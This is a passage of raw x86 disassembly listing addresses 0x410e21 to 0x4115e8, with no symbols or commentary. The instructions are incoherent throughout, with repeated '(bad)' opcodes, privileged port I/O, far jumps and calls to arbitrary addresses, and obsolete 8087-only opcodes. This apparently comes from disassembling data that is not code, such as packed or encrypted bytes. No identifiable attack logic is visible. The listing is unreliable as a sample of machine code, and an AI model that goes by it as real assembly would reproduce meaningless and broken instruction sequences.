  410e21:	sub    DWORD PTR [ebp-0x7a8dc854],esp
  410e27:	mov    dh,0x8
  410e29:	and    al,0x77
  410e2b:	push   cs
  410e2c:	sbb    al,0xd9
  410e2e:	in     al,0x33
  410e30:	repz adc DWORD PTR fs:[ebx],eax
  410e34:	cld    
  410e35:	outs   dx,BYTE PTR ds:[esi]
  410e36:	call   0x4ef78ec1
  410e3b:	inc    ebx
  410e3c:	jmp    0xb460:0x6d0dd010
  410e43:	inc    edx
  410e44:	push   ds
  410e45:	or     BYTE PTR [edx+0x7826b744],bl
  410e4b:	fcom   DWORD PTR [ebx+0x7d315306]
  410e51:	push   ds
  410e52:	cmc    
  410e53:	ror    ecx,1
  410e55:	(bad)  
  410e56:	retf   
  410e57:	dec    esi
  410e58:	ds out 0x9,eax
  410e5b:	pushf  
  410e5c:	fidiv  DWORD PTR [edx-0x5c]
  410e5f:	(bad)  
  410e60:	or     DWORD PTR es:[edx-0x6c88bf62],ecx
  410e67:	scas   al,BYTE PTR es:[edi]
  410e68:	jg     0x410df2
  410e6a:	inc    esi
  410e6b:	jmp    0x5b15:0xe7df0f98
  410e72:	adc    eax,esp
  410e74:	add    al,0x8a
  410e76:	scas   al,BYTE PTR es:[edi]
  410e77:	push   ebp
  410e78:	mov    ch,0xbc
  410e7a:	repnz pop edx
  410e7c:	repz xchg cl,dl
  410e7f:	idiv   BYTE PTR [ecx-0x2242c3b2]
  410e85:	xor    eax,DWORD PTR [ebx+edi*4-0x56bdb454]
  410e8c:	add    cl,BYTE PTR [ecx+eax*1+0x67]
  410e90:	jge    0x410ef2
  410e92:	punpcklbw mm7,DWORD PTR [edi]
  410e95:	sub    ch,0x7a
  410e98:	scas   eax,DWORD PTR es:[edi]
  410e99:	adc    ch,BYTE PTR [edx-0x79c2fb64]
  410e9f:	adc    BYTE PTR [eax+eiz*1-0x1b6fb8a4],0x63
  410ea7:	jo     0x410e31
  410ea9:	test   ch,ah
  410eab:	dec    edx
  410eac:	js     0x410e9e
  410eae:	sti    
  410eaf:	sub    eax,0x4212fb2
  410eb4:	xor    BYTE PTR [ecx-0x7893517f],ah
  410eba:	adc    bl,BYTE PTR [ebx+0x18]
  410ebd:	test   al,0xf3
  410ebf:	imul   esp,DWORD PTR [edx],0x515cd8ab
  410ec5:	cwde   
  410ec6:	jecxz  0x410ed5
  410ec8:	in     eax,dx
  410ec9:	mov    ds:0x925f095f,al
  410ece:	(bad)  [esi-0x60]
  410ed1:	pop    ss
  410ed2:	inc    ebp
  410ed3:	push   es
  410ed4:	ja     0x410e70
  410ed6:	das    
  410ed7:	retf   
  410ed8:	(bad)  
  410ed9:	cs dec esi
  410edb:	(bad)  
  410edc:	rcr    BYTE PTR [ebx-0x75],1
  410edf:	push   0xffffffd2
  410ee1:	mov    dl,0x6
  410ee3:	mov    ah,0x97
  410ee5:	repz call 0x68663eab
  410eeb:	sbb    BYTE PTR ds:0xa06b7ee,ch
  410ef1:	sbb    esp,edi
  410ef3:	mov    edx,ecx
  410ef5:	pop    ebx
  410ef6:	test   al,0x18
  410ef8:	jno    0x410f78
  410efa:	add    DWORD PTR [edi],edx
  410efc:	or     eax,0x8af10b47
  410f01:	jne    0x410f1c
  410f03:	into   
  410f04:	faddp  st(0),st
  410f06:	jmp    0x410eb6
  410f08:	test   al,0xe0
  410f0a:	inc    ecx
  410f0b:	add    ch,BYTE PTR [eax-0x33]
  410f0e:	and    edx,DWORD PTR [ebp+0x694d3ccd]
  410f14:	dec    edi
  410f15:	stc    
  410f16:	test   eax,0x3f8a4aae
  410f1b:	or     al,0x55
  410f1d:	and    DWORD PTR [ebx+edx*1],ebx
  410f20:	mov    dl,0xde
  410f22:	mov    edi,0xc5c19bab
  410f27:	cs sub eax,0x5260ac49
  410f2d:	pop    ebp
  410f2e:	adc    esi,ebp
  410f30:	inc    eax
  410f31:	xchg   DWORD PTR [ebx],edx
  410f33:	ds call 0x1ae081b7
  410f39:	out    dx,eax
  410f3a:	ss test eax,0x2e743e86
  410f40:	fmulp  st(6),st
  410f42:	daa    
  410f43:	arpl   WORD PTR [ebx+0x70],bp
  410f46:	mov    ch,0x37
  410f48:	pop    edx
  410f49:	outs   dx,DWORD PTR ds:[esi]
  410f4a:	jns    0x410f21
  410f4c:	xchg   BYTE PTR [eax],bh
  410f4e:	sub    al,0x8e
  410f50:	retf   0x9559
  410f53:	mov    bl,0x28
  410f55:	adc    DWORD PTR [edi-0xf],ebp
  410f58:	xor    DWORD PTR [edi+ecx*1],edi
  410f5b:	sbb    edi,eax
  410f5d:	jae    0x410f39
  410f5f:	pop    ds
  410f60:	xchg   ecx,eax
  410f61:	mov    al,0xd6
  410f63:	sbb    al,BYTE PTR [edx]
  410f65:	leave  
  410f66:	dec    ebx
  410f67:	dec    esp
  410f68:	aam    0x38
  410f6a:	loop   0x410f0f
  410f6c:	scas   eax,DWORD PTR es:[edi]
  410f6d:	in     eax,0x8b
  410f6f:	fimul  DWORD PTR [ecx-0x3e]
  410f72:	imul   eax,edx,0xffffffbd
  410f75:	je     0x410f7b
  410f77:	dec    eax
  410f78:	dec    esi
  410f79:	lock xor eax,0x97c49606
  410f7f:	in     al,0x32
  410f81:	sbb    ah,BYTE PTR [eax+0x4f500356]
  410f87:	jmp    0x410f57
  410f89:	push   ebx
  410f8a:	push   esp
  410f8b:	mov    eax,DWORD PTR [edx+0x295652eb]
  410f91:	and    edx,ecx
  410f93:	ja     0x410fc1
  410f95:	sub    bh,BYTE PTR ds:0xa562f2a6
  410f9b:	shl    DWORD PTR [edx+0x21],0x9f
  410f9f:	stc    
  410fa0:	call   0xc3a1da13
  410fa5:	add    edi,DWORD PTR [ebx]
  410fa7:	enter  0xcc18,0x28
  410fab:	dec    edi
  410fac:	and    al,0xe9
  410fae:	in     eax,dx
  410faf:	lahf   
  410fb0:	add    eax,0x1f040ba4
  410fb5:	adc    ch,cl
  410fb7:	xor    cl,ah
  410fb9:	cwde   
  410fba:	jecxz  0x410fb1
  410fbc:	push   cs
  410fbd:	pop    ds
  410fbe:	out    0xbd,eax
  410fc0:	cmp    dh,BYTE PTR [eax+0x43bf3e84]
  410fc6:	mov    BYTE PTR [esi+eiz*2+0x6e],dh
  410fca:	inc    ebx
  410fcb:	rcr    DWORD PTR [eax-0xe],1
  410fce:	mov    eax,0xc7fde63b
  410fd3:	mov    al,ds:0x6b00e4b8
  410fd8:	jecxz  0x410f7d
  410fda:	dec    esi
  410fdb:	mov    dh,0x59
  410fdd:	mov    esi,0xe98fc991
  410fe2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410fe3:	loop   0x410fd2
  410fe5:	repz mov al,0x3a
  410fe8:	jmp    0x23ba195f
  410fed:	sub    BYTE PTR [ebx+eax*4],dh
  410ff0:	or     BYTE PTR [eax],0xc9
  410ff3:	pop    eax
  410ff4:	xchg   ecx,eax
  410ff5:	xor    DWORD PTR [esi+esi*1+0x19438d82],ebx
  410ffc:	pop    ebp
  410ffd:	or     BYTE PTR [ebp+0x4e],ch
  411000:	jo     0x41100f
  411002:	ret    
  411003:	retf   
  411004:	aas    
  411005:	sub    esi,DWORD PTR [edi-0x737a9e80]
  41100b:	xor    al,BYTE PTR [eax+edi*2]
  41100e:	sti    
  41100f:	jbe    0x410fff
  411011:	push   es
  411012:	(bad)  
  411013:	imul   ebx,DWORD PTR [eax],0xffffffc1
  411016:	int3   
  411017:	mov    ecx,0xe892d45a
  41101c:	lds    eax,FWORD PTR [ebp+0xa]
  41101f:	mov    dh,0x44
  411021:	inc    esi
  411022:	not    BYTE PTR ds:0x826e57eb
  411028:	out    0x6d,eax
  41102a:	mov    ecx,0xdbcc4648
  41102f:	jp     0x4110ae
  411031:	faddp  st(2),st
  411033:	iret   
  411034:	jle    0x410fee
  411036:	cmc    
  411037:	dec    eax
  411038:	cmp    eax,0x40c15474
  41103d:	dec    eax
  41103e:	aaa    
  41103f:	aam    0xc1
  411041:	sbb    BYTE PTR [edx+0xb32b145],ch
  411047:	inc    esp
  411048:	jmp    0x2f64c1a1
  41104d:	pop    edi
  41104e:	cdq    
  41104f:	sti    
  411050:	pop    ebx
  411051:	icebp  
  411052:	adc    ah,BYTE PTR [esi]
  411054:	cmp    al,0x98
  411056:	fbstp  TBYTE PTR [edx]
  411058:	fsub   st,st(0)
  41105a:	(bad)  
  41105b:	sbb    al,0x0
  41105d:	loop   0x411084
  41105f:	fs push ecx
  411061:	imul   ebp,esi,0xffffffd6
  411064:	stos   DWORD PTR es:[edi],eax
  411065:	sub    DWORD PTR [edx+esi*1-0x726ca54],edi
  41106c:	mov    DWORD PTR [edx-0x7c73b819],0x97091030
  411076:	iret   
  411077:	sbb    DWORD PTR [edi+0x28],edx
  41107a:	neg    BYTE PTR [edi-0x42]
  41107d:	lea    ecx,[ebx+0x75f44fd4]
  411083:	push   0xffffffdb
  411085:	into   
  411086:	mov    ds:0xf35c3214,al
  41108b:	loop   0x411028
  41108d:	sti    
  41108e:	push   edi
  41108f:	xchg   ebx,eax
  411090:	dec    esi
  411091:	mul    ebx
  411093:	cmp    DWORD PTR [ebx+0x5b3c3043],ebp
  411099:	xchg   BYTE PTR [eax],bh
  41109b:	jmp    0x4f79fb23
  4110a0:	lods   eax,DWORD PTR ds:[esi]
  4110a1:	loopne 0x411040
  4110a3:	inc    ebx
  4110a4:	imul   edi,DWORD PTR [esi],0x30
  4110a7:	jmp    0x41105a
  4110a9:	nop
  4110aa:	sub    DWORD PTR [ecx-0x1d],esi
  4110ad:	sahf   
  4110ae:	lods   eax,DWORD PTR ds:[esi]
  4110af:	mov    edx,0x8f5a1e22
  4110b4:	push   ecx
  4110b5:	out    dx,eax
  4110b6:	test   al,0xaf
  4110b8:	leave  
  4110b9:	xchg   dl,al
  4110bb:	jmp    DWORD PTR [ebp+0xd4b7e1]
  4110c1:	pop    es
  4110c2:	icebp  
  4110c3:	cdq    
  4110c4:	je     0x411133
  4110c6:	adc    eax,0x81447452
  4110cb:	sbb    eax,DWORD PTR [eax-0x239cd2ff]
  4110d1:	jae    0x411075
  4110d3:	addr16 (bad) 
  4110d5:	repz lds ecx,FWORD PTR [ecx+0x39]
  4110d9:	xor    esi,DWORD PTR [ecx]
  4110db:	push   esi
  4110dc:	lds    ebx,FWORD PTR ds:0xf57b4546
  4110e2:	stc    
  4110e3:	cwde   
  4110e4:	js     0x411089
  4110e6:	pop    ecx
  4110e7:	cdq    
  4110e8:	into   
  4110e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ea:	js     0x411167
  4110ec:	jbe    0x4110fa
  4110ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110ef:	push   ds
  4110f0:	mov    ebx,0xcaa08ba2
  4110f5:	inc    ebx
  4110f6:	xlat   BYTE PTR es:[ebx]
  4110f8:	add    BYTE PTR [esi],ch
  4110fa:	fndisi(8087 only) 
  4110fc:	loop   0x4110f6
  4110fe:	pushw  0xff93
  411101:	and    BYTE PTR [ebx],0x66
  411104:	cmp    BYTE PTR [ebx+0x47],bl
  411107:	push   cs
  411108:	and    BYTE PTR [ecx-0x18],0x9d
  41110c:	adc    ch,cl
  41110e:	jmp    0x4ddd:0x1eb5aeb7
  411115:	cmc    
  411116:	mov    DWORD PTR [eax-0x20],esp
  411119:	push   ds
  41111a:	pop    edi
  41111b:	lea    eax,[ebx]
  41111d:	adc    al,0x42
  41111f:	push   ebx
  411120:	ins    DWORD PTR es:[edi],dx
  411121:	(bad)  
  411122:	out    dx,eax
  411123:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411124:	xchg   ecx,eax
  411125:	jo     0x411159
  411127:	xor    al,0x55
  411129:	cmp    al,0x80
  41112b:	sub    dl,BYTE PTR [ebx+ebx*8+0x2d]
  41112f:	adc    DWORD PTR ds:0x7df0a9ef,ecx
  411135:	je     0x411171
  411137:	sub    BYTE PTR [edi+edx*1+0x2f],0x7b
  41113c:	mov    bh,BYTE PTR [esi+0x36]
  41113f:	jb     0x4110c9
  411141:	pop    esi
  411142:	dec    ecx
  411143:	inc    esp
  411144:	sub    al,0x71
  411146:	sub    al,0xbf
  411148:	jg     0x411134
  41114a:	adc    esp,DWORD PTR [edx-0x49]
  41114d:	xchg   edx,eax
  41114e:	cmp    al,0xbc
  411150:	mov    ebx,eax
  411152:	adc    dl,bl
  411154:	rcl    DWORD PTR [edi-0x36f1adeb],cl
  41115a:	into   
  41115b:	retf   0xe354
  41115e:	std    
  41115f:	scas   eax,DWORD PTR es:[edi]
  411160:	sub    al,0xda
  411162:	(bad)  
  411164:	repnz or al,0xbc
  411167:	xchg   esi,eax
  411168:	xor    dh,BYTE PTR [edi]
  41116a:	mov    eax,0x9bdd27fe
  41116f:	pop    edx
  411170:	dec    edx
  411171:	mov    ecx,0x36b40cae
  411176:	sar    DWORD PTR [edi],cl
  411178:	jns    0x4110fa
  41117a:	xor    cl,bl
  41117c:	fwait
  41117d:	mov    edx,0x6c99b891
  411182:	aaa    
  411183:	sbb    DWORD PTR [ebp-0x35383ed3],esp
  411189:	push   eax
  41118a:	sbb    DWORD PTR [ebx+eax*2],0xf5f11290
  411191:	out    dx,eax
  411192:	cmp    eax,0x334fbefe
  411197:	inc    DWORD PTR [ebx]
  411199:	add    DWORD PTR [edx-0x67],eax
  41119c:	xor    eax,0xa65d4006
  4111a1:	fstp   DWORD PTR [edx-0x306685ec]
  4111a7:	push   ecx
  4111a8:	aaa    
  4111a9:	xchg   esi,eax
  4111aa:	popf   
  4111ab:	sbb    ebp,DWORD PTR [edi+edi*1-0x58]
  4111af:	jb     0x411138
  4111b1:	add    al,0xdb
  4111b3:	xor    BYTE PTR [ebx],0xe1
  4111b6:	inc    DWORD PTR [ecx]
  4111b8:	push   0x32
  4111ba:	pop    esp
  4111bb:	dec    ecx
  4111bc:	ficom  DWORD PTR ds:0xf6bd55c2
  4111c2:	mov    gs,WORD PTR [esi]
  4111c4:	ss dec edi
  4111c6:	dec    dh
  4111c8:	stc    
  4111c9:	and    al,BYTE PTR [esi]
  4111cb:	imul   edx,ecx,0xffffffb4
  4111ce:	push   ss
  4111cf:	push   ecx
  4111d0:	xor    al,0x26
  4111d2:	icebp  
  4111d3:	push   es
  4111d4:	push   esp
  4111d5:	iret   
  4111d6:	bound  ecx,QWORD PTR [edi]
  4111d8:	(bad)  
  4111d9:	or     eax,0xcddc4e22
  4111de:	cmp    BYTE PTR [esi],0x6a
  4111e1:	dec    esp
  4111e2:	mov    al,ds:0x14c650e0
  4111e7:	bound  ebp,QWORD PTR [ebx+0x6628bab]
  4111ed:	mov    esp,0xb6d637c
  4111f2:	aaa    
  4111f3:	sub    bl,BYTE PTR [eax+edi*2]
  4111f6:	lock fwait
  4111f8:	rcr    BYTE PTR [edi],cl
  4111fa:	cmp    cl,BYTE PTR [edx]
  4111fc:	jg     0x411235
  4111fe:	mov    ds:0x2571af27,eax
  411203:	sub    dh,dh
  411205:	fadd   QWORD PTR [ecx+ebp*1+0x49ba3aad]
  41120c:	and    eax,0x37b481e8
  411211:	iret   
  411212:	mov    dl,0x59
  411214:	sub    ebx,DWORD PTR [esi]
  411216:	adc    BYTE PTR [ecx],ch
  411218:	les    edi,FWORD PTR [esi-0x61]
  41121b:	nop
  41121c:	inc    ebp
  41121d:	pop    es
  41121e:	outs   dx,DWORD PTR ds:[esi]
  41121f:	jns    0x41124f
  411221:	js     0x4111b0
  411223:	mov    bl,0xd9
  411225:	fsub   st,st(7)
  411227:	cwde   
  411228:	mov    ecx,0x670428f0
  41122d:	fnsave [eax+eax*1]
  411230:	jbe    0x4111e4
  411232:	inc    esi
  411233:	xchg   BYTE PTR [edi-0x5ddb911f],dl
  411239:	sar    DWORD PTR [edi],cl
  41123b:	push   cs
  41123c:	add    BYTE PTR [edi-0x69bb45f7],al
  411242:	add    al,ch
  411244:	je     0x41124f
  411246:	jno    0x411251
  411248:	cmp    BYTE PTR [esi+0x5ce31793],0x4b
  41124f:	(bad)  
  411250:	cld    
  411251:	jo     0x4112c1
  411253:	scas   al,BYTE PTR es:[edi]
  411254:	out    dx,eax
  411255:	pushf  
  411256:	ds jge 0x4112b3
  411259:	and    BYTE PTR [edx+edi*2+0x5d9dd6cc],bl
  411260:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411261:	mov    esi,0x42f0cc35
  411266:	dec    edi
  411267:	(bad)  
  411268:	mov    ebx,DWORD PTR [edx+0x36547a32]
  41126e:	in     eax,0x4c
  411270:	jl     0x41122e
  411272:	jmp    0x954911ca
  411277:	stc    
  411278:	gs pushf 
  41127a:	dec    DWORD PTR [edi]
  41127c:	mov    ebp,0x393a718a
  411281:	lock adc edi,ebx
  411284:	arpl   WORD PTR [edx-0x2659541],sp
  41128a:	mov    es,esp
  41128c:	xor    esp,edi
  41128e:	aam    0xc9
  411290:	mov    ch,BYTE PTR [ecx]
  411292:	sbb    eax,0x1b7ffcc1
  411297:	pop    ss
  411298:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411299:	ja     0x41121b
  41129b:	xchg   edi,eax
  41129c:	sbb    DWORD PTR [ebx],0x75
  41129f:	jmp    edx
  4112a1:	mov    edx,0x2e1bef46
  4112a6:	(bad)  
  4112a8:	mov    edx,0x80b65b74
  4112ad:	mov    bl,0x39
  4112af:	jbe    0x411310
  4112b1:	sahf   
  4112b2:	gs cli 
  4112b4:	jecxz  0x411238
  4112b6:	xor    DWORD PTR [ebx-0x7d],edx
  4112b9:	xchg   ecx,eax
  4112ba:	dec    eax
  4112bb:	nop
  4112bc:	pop    ebp
  4112bd:	hlt    
  4112be:	cmp    edi,DWORD PTR [eax+0x3ac2b347]
  4112c4:	adc    edi,DWORD PTR [ebx+0x7d]
  4112c7:	ficomp DWORD PTR [eax+0xf]
  4112ca:	mov    ah,0xfa
  4112cc:	xor    BYTE PTR [ecx],bl
  4112ce:	jg     0x411339
  4112d0:	gs (bad) 
  4112d2:	repz push 0x26d599ae
  4112d8:	sar    BYTE PTR [ebx+0x18],cl
  4112db:	mov    ds:0x833116fc,eax
  4112e0:	ins    DWORD PTR es:[edi],dx
  4112e1:	cmp    BYTE PTR [ebx-0x4ca3696c],0x14
  4112e8:	sbb    eax,0xeb4d6220
  4112ed:	adc    eax,0x59190191
  4112f2:	nop
  4112f3:	js     0x4112b5
  4112f5:	test   BYTE PTR [edx],cl
  4112f7:	lea    edi,[edi+0x71]
  4112fa:	mov    esp,0xd921a24c
  4112ff:	mov    BYTE PTR [edx+esi*1-0x1e53dc84],0xf6
  411307:	pop    es
  411308:	pop    edx
  411309:	(bad)  
  41130a:	cwde   
  41130b:	in     al,0xc8
  41130d:	or     BYTE PTR [ecx+edx*4],0x3f
  411311:	lea    eax,[eax-0xb488fcd]
  411317:	cs cdq 
  411319:	retf   
  41131a:	inc    ecx
  41131b:	and    bl,dl
  41131d:	sub    DWORD PTR [edi+0x82482a0],0x21
  411324:	mov    ebp,0x5f6c755
  411329:	or     al,0x4c
  41132b:	inc    esp
  41132c:	xchg   ecx,eax
  41132d:	outs   dx,BYTE PTR ds:[esi]
  41132e:	test   DWORD PTR [edx],esi
  411330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411331:	or     bl,al
  411333:	dec    ebp
  411334:	div    BYTE PTR [esi-0x772e0447]
  41133a:	dec    esp
  41133b:	shr    BYTE PTR [esi],1
  41133d:	repnz xor ebx,DWORD PTR [ebx+0x2d]
  411341:	out    0x7c,eax
  411343:	repz adc edi,ecx
  411346:	dec    edx
  411347:	scas   eax,DWORD PTR es:[edi]
  411348:	je     0x41135d
  41134a:	xor    DWORD PTR [esi],esp
  41134c:	in     eax,dx
  41134d:	out    0x21,eax
  41134f:	xor    eax,DWORD PTR [eax-0xfeca610]
  411355:	outs   dx,BYTE PTR ds:[esi]
  411356:	repz inc edx
  411358:	cmp    edx,DWORD PTR [esi]
  41135a:	subps  xmm0,XMMWORD PTR [ebp+0x48]
  41135e:	fs (bad) 
  411360:	push   ds
  411361:	add    DWORD PTR [esp+eiz*4+0x68],esp
  411365:	push   0xffffff91
  411367:	imul   DWORD PTR [edx+0x53750a19]
  41136d:	std    
  41136e:	jns    0x41136a
  411370:	and    al,0x19
  411372:	inc    ebx
  411373:	push   esi
  411374:	loope  0x41134c
  411376:	test   eax,0x98a91604
  41137b:	sahf   
  41137c:	(bad)  
  41137d:	push   0x8cd54a1b
  411382:	adc    al,0x63
  411384:	push   ss
  411385:	ss pop eax
  411387:	jns    0x411404
  411389:	jmp    0x4113c8
  41138b:	sub    bh,BYTE PTR [esp+edx*2+0x4792e66e]
  411392:	fsubr  QWORD PTR [esi]
  411394:	repnz mov esi,0x87cf85b8
  41139a:	xlat   BYTE PTR ds:[ebx]
  41139b:	sub    esi,eax
  41139d:	test   al,0x47
  41139f:	jns    0x411354
  4113a1:	pop    ss
  4113a2:	pop    edi
  4113a3:	scas   eax,DWORD PTR es:[edi]
  4113a4:	jmp    0x7efd04ed
  4113a9:	adc    esi,DWORD PTR [eax]
  4113ab:	gs retf 0x1b66
  4113af:	xlat   BYTE PTR ds:[ebx]
  4113b0:	outs   dx,DWORD PTR ds:[esi]
  4113b1:	int3   
  4113b2:	out    dx,eax
  4113b3:	ds popf 
  4113b5:	loope  0x41136e
  4113b7:	xlat   BYTE PTR ds:[ebx]
  4113b8:	fs aaa 
  4113ba:	jne    0x411429
  4113bc:	rcr    edx,0x55
  4113bf:	mov    ebp,0xa3a8c569
  4113c4:	dec    ecx
  4113c5:	sti    
  4113c6:	sar    BYTE PTR [eax+0x46],0x75
  4113ca:	sub    cl,BYTE PTR [edx+0x2ea9ffc8]
  4113d0:	pop    ds
  4113d1:	hlt    
  4113d2:	loope  0x4113b3
  4113d4:	mov    ah,0xd9
  4113d6:	and    al,0x3c
  4113d8:	sub    ebp,DWORD PTR [edi]
  4113da:	ja     0x4113f8
  4113dc:	popa   
  4113dd:	xor    ah,BYTE PTR [ebx]
  4113df:	retf   
  4113e0:	push   ecx
  4113e1:	fimul  WORD PTR [ebx*2+0x2c37ff5f]
  4113e8:	or     al,0xe
  4113ea:	sub    al,0x3c
  4113ec:	and    ecx,DWORD PTR [ecx-0x48b7294e]
  4113f2:	sbb    DWORD PTR [ecx+0x6d],ebp
  4113f5:	jns    0x411377
  4113f7:	dec    edx
  4113f8:	adc    al,0x45
  4113fa:	ret    0x8879
  4113fd:	sbb    esi,DWORD PTR [edx]
  4113ff:	or     DWORD PTR [ecx+0x46],eax
  411402:	mov    ds:0x32f0bba7,eax
  411407:	fisttp QWORD PTR [edi-0x6cd5d7a7]
  41140d:	in     eax,0x36
  41140f:	out    dx,al
  411410:	jle    0x41146f
  411412:	sar    BYTE PTR [edi+0x5b],1
  411415:	into   
  411416:	push   ecx
  411417:	push   edx
  411418:	imul   edx,DWORD PTR [ebx-0x59],0x4e2ff71
  41141f:	xchg   edx,eax
  411420:	das    
  411421:	or     eax,0x3c055f8
  411426:	add    DWORD PTR [edx-0x6738d69d],0xffffff9c
  41142d:	out    0x75,al
  41142f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411430:	add    al,0xac
  411432:	retf   0xe81e
  411435:	add    dh,cl
  411437:	shl    BYTE PTR [ecx+0x3a],1
  41143a:	mov    al,ds:0x2274503d
  41143f:	cmp    BYTE PTR [edx],dl
  411441:	xchg   BYTE PTR [ecx+ecx*8],cl
  411444:	repnz xor esi,ebp
  411447:	mov    ebx,0xb5dc398d
  41144c:	cdq    
  41144d:	pushf  
  41144e:	bound  edx,QWORD PTR [ecx]
  411450:	inc    eax
  411451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411452:	mov    ebx,0x46b0eb75
  411457:	aad    0x68
  411459:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41145a:	cmp    BYTE PTR [edx+0x1c],ah
  41145d:	xor    eax,0x16666c53
  411462:	outs   dx,BYTE PTR ds:[esi]
  411463:	scas   al,BYTE PTR es:[edi]
  411464:	data16 cmp al,0x8f
  411467:	mov    cl,0x73
  411469:	inc    eax
  41146a:	mov    ebx,0x1ae67418
  41146f:	clc    
  411470:	mov    ds:0x256d1d46,al
  411475:	into   
  411476:	jae    0x41147a
  411478:	loopne 0x411457
  41147a:	sbb    esp,eax
  41147c:	loopne 0x411495
  41147e:	stc    
  41147f:	mov    dh,0x61
  411481:	push   cs
  411482:	push   ds
  411483:	aad    0x88
  411485:	scas   al,BYTE PTR es:[edi]
  411486:	(bad)  
  411487:	cli    
  411488:	jmp    0x411490
  41148a:	jp     0x411456
  41148c:	add    DWORD PTR [edx+0x7cef8d33],ebx
  411492:	jecxz  0x4114ff
  411494:	dec    ecx
  411495:	in     eax,0x8b
  411497:	dec    ebx
  411498:	jmp    0x706c36ce
  41149d:	(bad)  
  41149f:	xchg   edi,eax
  4114a0:	test   BYTE PTR [eax+edx*8+0x6f701eae],0x24
  4114a8:	(bad)  
  4114a9:	and    eax,DWORD PTR [eax]
  4114ab:	aaa    
  4114ac:	adc    BYTE PTR [ebp+0x52],ch
  4114af:	ret    0x1eb2
  4114b2:	std    
  4114b3:	adc    al,0xd9
  4114b5:	add    edi,edi
  4114b7:	call   0xf99b3cea
  4114bc:	mov    BYTE PTR [ebp+0x31],bl
  4114bf:	hlt    
  4114c0:	mov    edi,esi
  4114c2:	hlt    
  4114c3:	push   ss
  4114c4:	stos   BYTE PTR es:[edi],al
  4114c5:	sub    BYTE PTR [ebp-0x24295a08],bl
  4114cb:	or     ebx,DWORD PTR ds:0x1888abcb
  4114d1:	dec    eax
  4114d2:	(bad)  
  4114d3:	mov    esp,0x791a7692
  4114d8:	mov    al,0x9a
  4114da:	leave  
  4114db:	(bad)  
  4114dc:	jns    0x411540
  4114de:	je     0x4114b8
  4114e0:	adc    ebx,edx
  4114e2:	add    al,0x2d
  4114e4:	mov    es,WORD PTR [edx]
  4114e6:	jge    0x411552
  4114e8:	test   DWORD PTR [esi],0xae117683
  4114ee:	js     0x411516
  4114f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4114f1:	xor    BYTE PTR [ebx+0x66],bl
  4114f4:	aam    0xab
  4114f6:	push   ebx
  4114f7:	rol    esp,1
  4114f9:	mov    DWORD PTR [edx+0x31],edx
  4114fc:	sar    DWORD PTR [ebp-0x554bb9a7],1
  411502:	mov    edi,0xe41b0701
  411507:	or     al,0x60
  411509:	xchg   ebx,eax
  41150a:	stc    
  41150b:	push   0xf2cc89b1
  411510:	ret    
  411511:	into   
  411512:	aas    
  411513:	mov    esp,0xdffa3250
  411518:	sbb    BYTE PTR [esi+0x7d],cl
  41151b:	pop    edi
  41151c:	adc    DWORD PTR [ecx],ecx
  41151e:	not    BYTE PTR [ecx]
  411520:	int3   
  411521:	pop    eax
  411522:	dec    edi
  411523:	es xchg ecx,eax
  411525:	test   DWORD PTR [edx],eax
  411527:	dec    ebp
  411528:	pop    edx
  411529:	and    dl,BYTE PTR [ebx-0x5089bd31]
  41152f:	stc    
  411530:	pop    ss
  411531:	mov    WORD PTR [edx],?
  411533:	outs   dx,DWORD PTR ds:[esi]
  411534:	cmc    
  411535:	inc    edi
  411536:	adc    eax,DWORD PTR [edi-0x65783f48]
  41153c:	dec    esi
  41153d:	pusha  
  41153e:	cmp    ecx,edx
  411540:	mov    cs,ebp
  411542:	mov    al,0xc8
  411544:	sbb    dh,BYTE PTR [edi+edi*4+0x79808111]
  41154b:	push   ecx
  41154c:	push   es
  41154d:	cmc    
  41154e:	arpl   bp,bp
  411550:	ja     0x411525
  411552:	pop    ebp
  411553:	inc    ebp
  411554:	cmp    BYTE PTR [edx+0x4041fcbd],al
  41155a:	push   ss
  41155b:	imul   ecx,DWORD PTR [edi+0x2b],0x92dfb8b0
  411562:	push   ebx
  411563:	in     al,0x1f
  411565:	cmp    al,BYTE PTR [ebx+0x1e]
  411568:	xchg   esi,eax
  411569:	jecxz  0x411528
  41156b:	jno    0x411587
  41156d:	addr16 fsub st(5),st
  411570:	data16 fld QWORD PTR [esp+ebx*4-0x77]
  411575:	fadd   QWORD PTR [edx+0x48]
  411578:	call   0xb07015c9
  41157d:	add    ch,bh
  41157f:	stos   DWORD PTR es:[edi],eax
  411580:	test   BYTE PTR fs:[edi+0x46decdc7],bh
  411587:	enter  0x5a17,0xf9
  41158b:	ja     0x411527
  41158d:	and    edi,esp
  41158f:	pop    edx
  411590:	and    ecx,DWORD PTR [edi+0x64c1e66d]
  411596:	int3   
  411597:	jbe    0x411555
  411599:	sahf   
  41159a:	jno    0x4115cc
  41159c:	dec    ebp
  41159d:	scas   eax,DWORD PTR es:[edi]
  41159e:	int    0x98
  4115a0:	push   edx
  4115a1:	outs   dx,BYTE PTR ds:[esi]
  4115a2:	jo     0x411585
  4115a4:	jmp    0x411594
  4115a6:	das    
  4115a7:	enter  0x952c,0xd2
  4115ab:	or     BYTE PTR [ebx+0x1dde5a9d],ch
  4115b1:	and    al,0xb0
  4115b3:	inc    esp
  4115b4:	test   eax,esi
  4115b6:	ret    
  4115b7:	pop    ebx
  4115b8:	or     eax,0x37feba19
  4115bd:	fwait
  4115be:	mov    al,0xc9
  4115c0:	lock xor edx,edi
  4115c3:	mov    ecx,0x455ac090
  4115c8:	lods   al,BYTE PTR ds:[esi]
  4115c9:	jbe    0x41163f
  4115cb:	inc    eax
  4115cc:	arpl   bp,dx
  4115ce:	es (bad) 
  4115d1:	push   0x9ad9f9fa
  4115d6:	arpl   WORD PTR [edi+edx*8-0x2c65294c],cx
  4115dd:	dec    edi
  4115de:	push   ss
  4115df:	bound  edi,QWORD PTR [ecx+0x5d]
  4115e2:	retf   0x414c
  4115e5:	bound  edi,QWORD PTR [edi+0x2]
  4115e8:	add    al,0x7
